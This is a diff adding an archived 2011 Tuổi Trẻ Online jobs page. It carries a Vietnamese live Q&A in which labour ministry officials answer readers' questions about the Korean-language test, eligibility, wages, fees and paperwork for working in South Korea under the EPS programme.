@@ -1,0 +1,1378 @@
+
+<HTML>
+
+	<HEAD>
+		<title>Tuổi Trẻ Online - Việc làm Online</title>
+		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
+		<LINK href="Tianyon.css" type="text/css" rel="stylesheet">
+		<script src="Tianyon.js" type="text/javascript"></script>
+		<script src="Calendar/PopCalendar.js" type="text/javascript"></script>
+		<script language="JavaScript" src="vietuni/js/vietuni.js" type="text/javascript"></script>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<link rel="shortcut icon" href="favicon.ico" />
+	</HEAD>
+	
+	<body leftmargin="0" topmargin="0" rightmargin="0">
+		<table width="789" height="99" border="0" align="center" background="Images/BgTop.jpg" cellpadding="0" cellspacing="0">
+			<tr>
+				<td width="300px"><a href="http://tuoitre.vn"><img style="border:0px" src="Images/Logo.gif"></a>					
+				</td>
+				<td>	
+					<!--<Cache Time='10/11/2011 11:42:55 CH'>--><!--</Cache>-->					
+				</td>
+			</tr>
+		</table>
+		
+		<table  width="789" height="85" align="center" bgcolor="#FFFFFF" background="Images/bg_header.gif" cellpadding="0" cellspacing="0">
+			<tr height="50">
+				<td valign="bottom" width="50%">					
+				</td>
+				<td  valign="bottom" width="50%">
+					
+<form >
+	<table height="20" cellSpacing="0" cellPadding="0" width="100%" border="0">
+		<TBODY>
+			<tr>
+				<td align="right" valign="top" class="BreakingTitle">Tìm kiếm
+				  	<INPUT id="txtKeyword" style="height:20px; background-color:#FBEFD6" type="text" size="12" name="SearchQuery" class="FlatControl" onkeypress="return trapEnterKey(this.value,event);">
+			  	</td>
+				<td align="center" width="50">
+					<INPUT type="image" src="Images/search.gif" value="1" name="image" onclick="searchEngine();">
+				</td>
+				<td align="left">
+					<select name="searchSubmit$cboInputMethod" id="searchSubmit_cboInputMethod" style="width: 55px; height: 20px; background-color:#FBEFD6; list-style-image:url(http://localhost/vieclam/template/Menu/ComboImage.gif);" onchange="setTypingMode(this.value * 1)" class="FlatControl">
+	<option selected="selected" value="0">Off</option>
+	<option value="1">Telex</option>
+	<option value="2">VNI</option>
+</select>
+				</td>
+			</tr>
+		</TBODY>
+	</table>
+</form>
+<script>
+//	setTypingMode(document.all.item("searchSubmit:cboInputMethod").selectedIndex);
+//	initTyper(document.all.item("SearchQuery"));
+//	document.SearchSubmit.SearchQuery.value = destroyURL(GetPostVariable('SearchQuery', '').replace(/\+/g, ' '));
+</script>
+<script type="text/javascript" language="javascript">
+    /* URL encode / decode */
+    var Url =
+    {
+        // public method for url encoding
+        encode: function(string) {
+            return escape(this._utf8_encode(string));
+        },
+
+        // public method for url decoding
+        decode: function(string) {
+            return this._utf8_decode(unescape(string));
+        },
+
+        // private method for UTF-8 encoding
+        _utf8_encode: function(string) {
+            string = string.replace(/\r\n/g, "\n");
+            var utftext = "";
+
+            for (var n = 0; n < string.length; n++) {
+
+                var c = string.charCodeAt(n);
+
+                if (c < 128) {
+                    utftext += String.fromCharCode(c);
+                }
+                else if ((c > 127) && (c < 2048)) {
+                    utftext += String.fromCharCode((c >> 6) | 192);
+                    utftext += String.fromCharCode((c & 63) | 128);
+                }
+                else {
+                    utftext += String.fromCharCode((c >> 12) | 224);
+                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+                    utftext += String.fromCharCode((c & 63) | 128);
+                }
+
+            }
+
+            return utftext;
+        },
+
+        // private method for UTF-8 decoding
+        _utf8_decode: function(utftext) {
+            var string = "";
+            var i = 0;
+            var c = c1 = c2 = 0;
+
+            while (i < utftext.length) {
+
+                c = utftext.charCodeAt(i);
+
+                if (c < 128) {
+                    string += String.fromCharCode(c);
+                    i++;
+                }
+                else if ((c > 191) && (c < 224)) {
+                    c2 = utftext.charCodeAt(i + 1);
+                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+                    i += 2;
+                }
+                else {
+                    c2 = utftext.charCodeAt(i + 1);
+                    c3 = utftext.charCodeAt(i + 2);
+                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+                    i += 3;
+                }
+            }
+            return string;
+        }
+    }
+
+
+    function searchEngine() {
+        var url = "http://tuoitre.vn/Tim-kiem/Index.html?keyword=";
+
+        url += Url.encode(document.getElementById("txtKeyword").value) + "&scope=*&channel=-1&from=&to=&page=1";
+        window.open(url, "_blank", "", "");
+    }
+  
+</script>
+
+<script type="text/javascript" language="javascript">
+    function trapEnterKey(value, e) {
+        // the purpose of this function is to allow the enter key to
+        // point to the correct button to click.
+        var key;
+
+        if (window.event) {
+            // IE
+            key = window.event.keyCode;
+        }
+        else {
+            // firefox
+            key = e.which;
+        }
+
+        if (key == 13) {
+            var q = value;
+
+            if (q == '') {
+                return false;
+            }
+
+            if ((q.indexOf('AND') == -1) && (q.indexOf('OR') == -1) && (q.indexOf('"') == -1)) {
+                //q = '"' + q + '"';
+                q = q;
+            }
+
+            // endcode
+            q = Url.encode(q);
+
+            var urltto = "http://tuoitre.vn/Tim-kiem/Index.html?scope=*&channel=-1&from=&to=&page=1&keyword=" + q;
+            window.open(urltto, "_blank", "", "");
+
+            event.keyCode = 0;
+
+            return false;
+        }
+
+        return true;
+    }                         
+</script>
+				</td>
+			</tr>
+			<tr>
+				<td colspan="2" valign="top">					
+					
+
+<table cellSpacing="0" cellPadding="0" align="center" width="760" border="0">
+	<tr height="0">
+		<td>			
+		</td>
+	</tr>
+</table>
+<table cellSpacing="0" cellPadding="0" align="center" width="740" border="0"> 
+	<tr valign="top">				                
+	    <td height="21" align="center">
+			<span class="MenuHeader" style="margin-top:0px">Một chuyên trang của Tuổi Trẻ Online</span>
+		</td>
+		<td height="21" align="center">
+			<a class="MenuTitle" href="http://tuoitre.vn/" style="margin-top:0px">
+				TUỔI TRẺ Online
+			</a>
+		</td>
+		<td height="21" >
+			<img src="template/Menu/Space.gif" />
+		</td>	
+		<td height="21" align="center">
+			<a class="MenuItem" href="http://vieclam.tuoitre.vn" style="margin-top:0px">
+				Trang nhất
+			</a>
+		</td>
+		
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center">
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=271'>					
+				Tư vấn
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=272'>					
+				Kinh nghiệm
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=269'>					
+				Thời sự
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=697'>					
+				Hướng nghiệp
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=275'>					
+				Cuộc thi
+			</a>
+		</td>
+	</tr>	
+</table>
+				</td>
+			</tr>
+		</table>
+			
+		<table width="789" border="0" cellpadding="0" cellspacing="0" align="center"  bgcolor="#EEB94A">			
+			<tr height="0">
+				<td colspan="6"></td>
+			</tr>
+			<tr>
+				<td align="left" style="display:none">
+					
+				</td>
+				<td nowrap width="13"></td>
+				<td nowrap width="576" align="center" vAlign="top">					
+					
+<script>
+ function onResponseClick()
+ {
+	showDialog('MailTo.aspx?ArticleID=' + GetPostVariable("ArticleID", null), 350, 420)
+ }
+</script>
+<table cellSpacing="0" cellPadding="0" width="100%" border="0" background="images/khaki.gif">
+	<tr height=25>
+		<td vAlign="middle" width="100%" bgColor="#000066">&nbsp;&nbsp;<A class=ChannelListTitle href="Index.aspx?ChannelID=269">Việc làm Online</A></td>
+	</tr>
+	<tr>
+		<td vAlign="top" width="100%" align="center">
+			<table cellSpacing="0" cellPadding="0" width="95%" border="0">
+				<tr>
+					<td width="100%"><div id="divContent"><script>getTimeString('2011/11/10 08:24:07');</script><br><P class=pTitle>Nhiều cơ hội xuất khẩu lao động&nbsp;đi Hàn Quốc</P>
+<P class=pBody>*&nbsp;<STRONG>Kỳ kiểm tra tiếng Hàn sắp tới:&nbsp;ngày 17-12-2011 </STRONG></P>
+<P class=pHead>TTO - Sáng nay 10-11, các khách mời giao lưu trực tuyến tại Tuổi Trẻ Online đã trả lời nhiều vấn đề bạn đọc quan tâm: Làm thế nào đi lao động ở Hàn Quốc? Chi phí xuất khẩu lao động? Mức lương và thu nhập?… </P>
+<P class=pBody>
+<TABLE style="BORDER-COLLAPSE: separate" class=tLegend border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530449" Hyperlink></TD></TR>
+<TR>
+<TD>Người lao động tại TP.HCM đăng ký hồ sơ dự kỳ kiểm tra tiếng Hàn lần 6, tổ chức ngày 25-4-2010 - Ảnh: nld.com.vn</TD></TR></TBODY></TABLE></P>
+<P class=pBody>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width="96%" align=center>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center>
+<P class=pBody>Các khách mời của buổi giao lưu trực tuyến "Cơ hội xuất khẩu lao động Hàn Quốc":</P>
+<P class=pBody>- <STRONG>Ông Đào Công Hải</STRONG> - phó cục trưởng Cục Quản lý lao động ngoài nước</P>
+<P class=pBody>- <STRONG>Ông Nguyễn Thanh Tùng </STRONG>- phó trưởng phòng quản lý lao động </P>
+<P class=pBody>- <STRONG>Ông Nguyễn Như Tuấn</STRONG> - phó trưởng phòng thị trường Cục Quản lý lao động ngoài nước</P>
+<P class=pBody>- <STRONG>Bà Phạm Thị Việt Hoa</STRONG> - phó trưởng phòng thông tin - tuyên truyền Cục Quản lý lao động ngoài nước</P>
+<P class=pBody>- <STRONG>Ông Phan&nbsp;Văn Minh</STRONG> - giám đốc Trung tâm Lao động ngoài nước</P>
+<P class=pBody>- <STRONG>Ông Lê Mạnh Hùng</STRONG> - trưởng phòng tuyển dụng Trung tâm Lao động ngoài nước</P>
+<P class=pBody><FONT size=1>&gt;&gt;</FONT> <A href="http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ArticleID=463600&amp;ChannelID=269" resizable="yes" toolbar="yes" titlebar="yes" scrollbars="yes" menubar="yes" statusbar="yes" location="yes">15.000 người có cơ hội sang Hàn Quốc lao động</A><BR><FONT size=1>&gt;&gt;</FONT> <A href="http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ArticleID=463989&amp;ChannelID=269" resizable="yes" toolbar="yes" titlebar="yes" scrollbars="yes" menubar="yes" statusbar="yes" location="yes">Người lao động 23 xã, phường tạm thời không được thi tiếng Hàn</A><BR><FONT size=1>&gt;&gt;</FONT> <A href="http://tuoitre.vn/Chinh-tri-Xa-hoi/463523/Tiep-tuc-tuyen-lao-dong-di-Han-Quoc.html" resizable="yes" toolbar="yes" titlebar="yes" scrollbars="yes" menubar="yes" statusbar="yes" location="yes">Tiếp tục tuyển lao động đi Hàn Quốc</A></P></TD></TR></TBODY></TABLE></P>
+<P class=pBody align=center><STRONG>MỜI THEO DÕI NỘI DUNG BUỔI GIAO LƯU</STRONG></P>
+<P class=pBody align=center>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530812" Hyperlink></TD></TR>
+<TR>
+<TD>
+<P class=tLegend>Toàn cảnh cuộc giao lưu trực tuyến tổ chức tại văn phòng&nbsp;đại diện báo <EM>Tuổi Trẻ</EM> ở&nbsp;Hà Nội - Ảnh: Nguyễn Khánh </P></TD></TR></TBODY></TABLE></P>
+<P class=pQuestion>* Tại TP.HCM điểm đăng ký tại đâu ạ? Lên sở TBXH&nbsp;ở quận 3 đăng ký phải không? Em ở quận 9.&nbsp;Đang là sinh viên và không có hộ khẩu thường trú tại TP.HCM, em muốn đăng ký thì xin xác nhận là sinh viên của trường đang theo học&nbsp;là được đăng ký không? (Trần Thị Giang, 25 tuổi, quynhgiangtran87@...)</P>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh</STRONG> (GĐ TT Lao động Ngoài nước - Bộ LĐ - TB - XH)<STRONG>:</STRONG> Người lao động có hộ khẩu&nbsp;thường trú tại TP.HCM và&nbsp;những học sinh, sinh viên&nbsp;đang học các trường chuyên nghiệp hoặc các trường dạy nghề hệ dài hạn,&nbsp;đóng trên&nbsp;địa bàn TP.HCM thì đăng ký tham dự kiểm tra tiếng Hàn tại Sở Lao động -&nbsp;Thương binh và&nbsp;xã&nbsp;hội TP.HCM. Nếu là sinh viên, khi đăng ký tham dự kiểm tra cần phải mang theo&nbsp;chứng minh nhân dân và thẻ sinh viên.</P>
+<P class=pBody>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=0 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530817" Hyperlink></TD></TR>
+<TR>
+<TD>
+<P class=tLegend>Ông Hồ Thành Vinh, phó trưởng văn phòng đại diện báo <EM>Tuổi Trẻ</EM> tại Hà Nội, chụp ảnh lưu niệm với các khách mời&nbsp; - Ảnh: Nguyễn Khánh </P></TD></TR></TBODY></TABLE></P>
+<DIV id=50407>
+<P class=pQuestion>* Em là kỹ sư, muốn đi lao động Hàn Quốc. Xin hỏi&nbsp;mức lương em có thể được nhận, em có được đi làm thêm không? Làm thêm ở bên ngoài có được không? (Hải Minh, 25 tuổi)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn </STRONG>(phó trưởng phòng thị trường Cục Quản lý lao động ngoài nước): Hàn Quốc có chương trình tiếp nhận lao động trình độ cao như kỹ sư theo chương trình thẻ vàng. Mức lương đối với loại hình lao động này sẽ được thỏa thuận trực tiếp giữa người lao động và chủ sử dụng lao động trong khuôn khổ pháp luật lao động của Hàn Quốc. Trong thời gian làm việc tại Hàn Quốc, bạn có thể làm thêm giờ nhưng tại nơi bạn đang làm việc. </P>
+<P class=pQuestion>*&nbsp;Đang là đầu bếp, tôi có thể đi xuất khẩu lao động được không? Tôi có phải thi chứng chỉ tiếng Hàn không? Chi phí đi bao nhiêu? Tôi thấy người Hàn qua đây tuyển đầu bếp qua công ty môi giới nhiều lắm, chi phí một lần đi là 8.000 USD. Cảm ơn. (PHẠM CÔNG THƯ, 26 tuổi, chieunhatha2006)</P>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530813" Hyperlink></TD></TR>
+<TR>
+<TD class=tLegend>Ông Đào Công Hải (bên trái), phó cục trưởng Cục Quản lý lao động ngoài nước,&nbsp;trả lời câu hỏi của bạn&nbsp;đọc&nbsp;- Ảnh: Nguyễn Khánh </TD></TR></TBODY></TABLE></P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Thông tin bạn đưa chúng tôi thấy chưa chính xác, vì Hàn Quốc nhận lao động phổ thông ở các lĩnh vực sản xuất, chế tạo, nông nghiệp, thủy sản và nếu chương trình "thẻ vàng" là các chuyên gia. Nếu đang là đầu bếp, bạn chỉ đi theo chương trình phổ thông và bạn phải có tay nghề ở các lĩnh vực chế tạo, dệt may, công nghiệp nhựa, da giày...</P>
+<P class=pAnswer>Còn việc bạn nói Hàn Quốc qua môi giới tuyển lao động là đầu bếp với chi phí 8.000 USD là không nằm trong các chương trình mà chúng tôi quản lý. Đề nghị bạn nên cẩn trọng với thông tin này. Bạn có thể liên hệ trực tiếp với sở LĐTB-XH địa phương nơi bạn cư trú để được tư vấn thêm.</P>
+<DIV id=50423>
+<P class=pQuestion>* Tôi là con thương binh 2/4, muốn đi lao&nbsp;động tại&nbsp;Hàn Quốc có&nbsp;được ưu tiên gì không và cần có những thủ tục gì? (Hoàng Mạnh Tuấn, 30 tuổi, plpharmacy76@)</P></DIV>
+<DIV id=50396>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Xin chia sẻ với bạn, theo quy định của Hàn Quốc thì mọi công dân đều có quyền, trách nhiệm&nbsp;và nghĩa vụ như nhau. Do đó bạn không có ưu tiên gì. Khi bạn muốn sang lao động Hàn Quốc, bạn&nbsp;đăng ký tại sở LĐTBXH nơi bạn cư trú&nbsp;để được giải đáp và hướng dẫn thực hiện việc thi tiếng Hàn vào ngày 17, 18-12-2011 do Hàn Quốc tổ chức. Bạn có thể đến kiểm tra, nếu đủ điều kiện bạn sẽ được hướng dẫn làm những thủ tục cần thiết.</P></DIV>
+<P class=pAnswer>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width="95%" align=center>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<P class=pQuestion>* Thủ tục cần thiết để đi xuất khẩu lao động Hàn Quốc? Mức lương bao nhiêu? Có cần phải ký quỹ không? Người lao động hưởng chính thức là bao nhiêu? Đi làm hợp đồng mấy năm? Có được về thăm nhà hằng năm không? Làm trong những&nbsp;môi trường nào? Tôi đang có bằng sĩ quan hàng hải, xin hỏi có được nhận không? (Lê Văn Toản, 28 tuổi, letoan060584@)</P>
+<P class=pAnswer>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530814" Hyperlink></TD></TR>
+<TR>
+<TD>
+<P class=tLegend>Ông Phan Văn Minh (bên trái), giám đốc Trung tâm Lao động&nbsp;ngoài nước, tại buổi trả lời trực tuyến&nbsp;độc giả &nbsp;- Ảnh: Nguyễn Khánh</P></TD></TR></TBODY></TABLE></P>
+<P class=pAnswer>- <STRONG>Ông Phan Văn Minh</STRONG>: Trước hết người lao động phải vượt qua kỳ kiểm tra tiếng Hàn theo yêu cầu phía Hàn Quốc và đáp ứng những điều kiện theo quy định phía Hàn Quốc, cụ thể:</P>
+<P class=pAnswer>+ Bạn phải đủ từ 18 tuổi đến 39 tuổi.</P>
+<P class=pAnswer>+ Đủ sức khỏe để đi làm việc ở nước ngoài.</P>
+<P class=pAnswer>+ Không có tiền án.</P>
+<P class=pAnswer>+ Không bị cấm xuất cảnh Việt Nam.</P>
+<P class=pAnswer>+ Không bị cấm nhập cảnh Hàn Quốc.</P>
+<P class=pAnswer>Về mức lương: Mức lương cơ bản tại Hàn Quốc hiện nay là 4.320won/giờ; 898.560won/tháng đối với tuần làm việc 40 giờ; 976.320won/tháng đối với tuần làm việc 44 giờ. </P>
+<P class=pAnswer>Người lao động được làm việc tại Hàn Quốc theo hợp đồng 3 năm và được ra hạn tối đa thêm 1 năm 10 tháng. Người lao động không được về thăm nhà hằng năm. </P>
+<P class=pAnswer>Hàn Quốc tiếp nhận lao động Việt Nam làm việc trong các ngành: sản xuất chế tạo, xây dựng, nông nghiệp và ngư nghiệp. Hàn Quốc tiếp nhận lao động trong ngành ngư nghiệp. </P>
+<P class=pAnswer>Tuy nhiên, theo quy&nbsp;định của Bộ LĐTB&amp;XH Việt Nam, kỳ&nbsp;kiểm tra tiếng Hàn ngày 17-12-2011&nbsp;đối tượng&nbsp;đăng ký dự tuyển trong ngành ngư&nbsp;nghiệp phải là những người&nbsp;đang&nbsp;làm nghề&nbsp;đánh bắt thủy&nbsp;hải sản và có hộ khẩu thường trú tại các xã ven biển. </P>
+<P class=pAnswer>Nếu bạn&nbsp;đáp&nbsp;ứng&nbsp;được&nbsp;những&nbsp;điều kiện trên thì làm thủ tục&nbsp;đăng ký tại&nbsp;sở LĐTB&amp;XH của&nbsp;địa phương mà&nbsp;bạn&nbsp;đang cư trú.&nbsp;</P></FONT></FONT></FONT></TD></TR></TBODY></TABLE></P></DIV>
+<DIV id=50408>
+<P class=pQuestion>* Tôi muốn đi xuất khẩu lao động qua Hàn Quốc thì tôi cần những điều kiện gì? Những loại giấy tờ nào? Tổng số tiền tôi phải nộp là bao nhiêu? Xin hồ sơ ở đâu? Hiện tôi đang ở TP.HCM. Xin cảm ơn. (Phạm Thị Hòa, 30 tuổi, immigration_702@)</P>
+<P class=pAnswer><STRONG>-&nbsp;Ông Lê Mạnh Hùng </STRONG>(trưởng phòng tuyển chọn lao động TT Lao động ngoài nước):<STRONG> </STRONG>Khi vượt qua kỳ kiểm tra tiếng Hàn, người lao động phải làm hồ sơ đăng ký dự tuyển. Hồ sơ đăng ký dự tuyển mua tại Sở Lao&nbsp;động - Thương binh và Xã hội nơi&nbsp;đăng ký kiểm tra tiếng Hàn (cụ thể bạn đang ở TP.HCM thì đến Sở LĐTBXH TP.HCM). </P>
+<P class=pAnswer>Hồ sơ&nbsp;bao gồm: Giấy khám và chứng nhận sức khỏe; Sơ yếu lý lịch; Đơn tự nguyện đăng ký dự tuyển đi làm việc tại Hàn Quốc; Bản đăng ký dự tuyển; các chứng chỉ nghề, bằng cấp chuyên môn nếu có; Hộ chiếu còn hạn tối thiểu là 12 tháng.</P>
+<P class=pAnswer>Tổng số tiền người lao động phải nộp là 630 USD. Số tiền này để trang trải chi phí mua vé máy bay, lệ phí xin cấp visa, học phí bồi dưỡng kiến thức cần thiết, chi phí tuyển chọn xử lý hồ sơ của người lao động. Khi xuất cảnh phải nộp 280.000 VND để mua trang phục mùa&nbsp;hè hoặc 300.000 VND&nbsp;để mua trang phục mùa đông; Nộp 100.000 VNĐ vào Quỹ Hỗ trợ việc làm ngoài nước.</P>
+<P class=pAnswer>Ngoài ra người lao động phải mang theo 500 USD sang Hàn Quốc để mua bảo hiểm rủi ro và bảo hiểm hồi hương.</P>
+<DIV id=50394>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width=200 align=left>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<DIV id=50376>
+<P class=pQuestion>* Xin cho biết là học tiếng Hàn ở các trung tâm ngoại ngữ khác thì có được đăng ký dự thi hay không, hay là phải học tiếng ở các trung tâm quy định. (Nguyễn Thanh Việt, vikhuannau@)</P></DIV>
+<DIV id=50392>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Khi đăng ký kiểm tra tiếng Hàn không đòi hỏi người lao động phải xuất trình chứng chỉ tiếng Hàn. Do đó người lao động học ở bất kỳ trung tâm nào hoặc tự học đều có thể đăng ký dự thi kiểm tra&nbsp;tiếng Hàn.</P>
+<P class=pQuestion>* Tôi muốn sang Hàn Quốc lao động nhưng tôi không biết tiếng Hàn có được đào tạo không? Thời gian đào tạo bao lâu mới được phỏng vấn lao động? Kinh phí đào tạo? (Nguyễn Hữu Phúc, 26 tuổi, tao_hotrothue@).</P>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG> Người lao động muốn sang Hàn Quốc lao động theo chương trình cấp phép việc làm cho lao động của Hàn Quốc (EPS) phải tự học tiếng Hàn để đủ trình độ tham dự và vượt qua kỳ kiểm tra tiếng Hàn do Bộ Việc làm và Lao động Hàn Quốc phối hợp với Bộ LĐTB&amp;XH tổ chức.</P></DIV></FONT></FONT></FONT></TD></TR></TBODY></TABLE>* Khi nào có đợt tuyển lao động qua HQ (gần đây nhất)? Các công việc cho lao động là nam giới? Mức lương tương ứng mỗi công việc? Thủ tục như thế nào? (Lê Hà Trang, 22 tuổi, le_hatrang@)</P>
+<P class=pAnswer>- <STRONG>Ông Nguyễn Như Tuấn</STRONG>: Phía Hàn Quốc tiếp nhận lao động VN trên nhiều lĩnh vực như sản xuất chế tạo, xây dựng, thủy sản, nông nghiệp. Bạn có thể cân nhắc khả năng của mình để quyết định cho phù hợp. Mức lương tương ứng và thủ tục cho mỗi lao động&nbsp;đi làm việc tại Hàn Quốc,&nbsp;tôi đã&nbsp;trả lời&nbsp;ở&nbsp;những câu hỏi khác,&nbsp;bạn có thể tham khảo. </P></DIV>
+<DIV id=50351>
+<P class=pQuestion>* Thu nhập hợp đồng lao động ra sao?&nbsp;Sau khi qua đó mình làm ngày mấy tiếng? Ăn uống mình tự lo hay sao? Cho em hỏi điều kiện được đi hợp tác lao động là như thế nào? (Trần Hữu Sang, 23 tuổi, hs_huusang_hs@)</P>
+<P class=pAnswer>-<STRONG> Ông Nguyễn Như Tuấn</STRONG>: Khi sang làm việc tại&nbsp;Hàn Quốc, bạn sẽ được hưởng mức lương giờ là 4.320 won, tiền lương tháng sẽ là 898.560 won (tuần làm việc 40 giờ) và 976.320 won (tuần làm việc 44 giờ). </P>
+<P class=pAnswer>Bạn sẽ phải tự mình chi trả ăn uống, tuy nhiên trên thực tế có chủ sử dụng hỗ trợ ăn uống cho lao động. </P>
+<P class=pAnswer>Muốn sang làm việc tại Hàn Quốc, một trong những điều kiện cần thiết là bạn phải vượt qua được kỳ kiểm tra tiếng Hàn. </P>
+<P class=pAnswer>Điều kiện để tham dự kiểm tra tiếng Hàn là: Từ 18-39 tuổi (những người sinh từ ngày 19-12-1971 đến 18-12-1993), chưa có tiền án tiền sự, chưa từng bị trục xuất hoặc buộc phải xuất cảnh khỏi Hàn Quốc, không bị cấm xuất cảnh VN hoặc cấm nhập cảnh Hàn Quốc; có đủ sức khỏe để đi làm việc tại nước ngoài.</P>
+<P class=pAnswer>Kỳ kiểm tra tiếng Hàn đợt tới sẽ được tổ chức trong&nbsp;hai ngày 17 và 18-12-2011. </P>
+<P class=pAnswer>Thời hạn đăng ký dự kiểm tra từ 11 đến 14-11-2011 tại Sở Lao động thương binh và xã hội ở địa phương nơi bạn cư trú. </P></DIV>
+<DIV id=50410>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width=220 align=right>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<P class=pQuestion>* Tôi muốn chỉ mặt một số "cò" chuyên nhận tiền để chạy điểm thì cần báo cho ai, địa chỉ, số điện thoại? Tôi cảm ơn các đồng chí. (thanh nguyen, 44 tuổi, cafe_kr@)</P>
+<P class=pAnswer>-&nbsp;<STRONG>Ông Đào Công Hải </STRONG>(phó cục trưởng Cục Quản lý lao động ngoài nước): Chúng tôi xin cảm ơn bạn có tinh thần trách nhiệm cao này. </P>
+<P class=pAnswer>Nếu bạn phát hiện&nbsp;những cá nhân, tổ chức không có trách nhiệm mà lợi dụng chương trình để làm cò mồi, thu tiền bất hợp pháp của người lao động thì đề nghị bạn thông báo cho các cơ quan của&nbsp;Sở LĐTB-XH ở địa phương,&nbsp;Trung tâm Lao động ngoài nước, hoặc Cục Quản lý lao động ngoài nước thuộc Bộ LĐTB-XH. </P>
+<P class=pAnswer>Hoặc báo cho các cơ quan công an. </P>
+<P class=pAnswer>Bạn cũng có thể gọi điện thoại đến đường dây nóng của chương trình để báo cáo vụ việc cho các cơ quan chức năng xem xét, xử lý: <STRONG>04-3734.6093/ 04-3734.6751</STRONG>.</P></FONT></FONT></FONT></TD></TR></TBODY></TABLE>* Em đã học tiếng Hàn và rất muốn có cơ hội sang lao động tại Hàn Quốc, nhưng em chỉ cao 1,50m, liệu điều này có ảnh hưởng đến việc em được lựa chọn sang lao động tại Hàn Quốc không kể cả khi em đỗ kỳ thi kiểm tra năng lực tiếng Hàn? (Lê Thùy Ngân, 26 tuổi, tngan85@)</P>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Theo quy định tại thông tư liên tịch&nbsp;số 10/2004/TTLT-BYT-BLĐTBXH-BTC của Liên tịch Bộ Y tế&nbsp;Bộ LĐTBXH và Bộ Tài chính thì người lao động nam&nbsp;phải cao từ 1,5m trở lên&nbsp;và lao động nữ cao từ 1,45m trở lên thì đủ&nbsp;điều kiện&nbsp;về chiều cao để được đi làm việc tại nước ngoài. Tuy nhiên người lao động&nbsp;đã vượt qua kỳ kiểm tra tiếng Hàn,&nbsp;đã gửi hồ sơ dự tuyển sang Hàn Quốc,&nbsp;có được đi làm việc tại Hàn Quốc hay không còn phụ thuộc vào sự lựa chọn của chủ sử dụng lao động.</P>
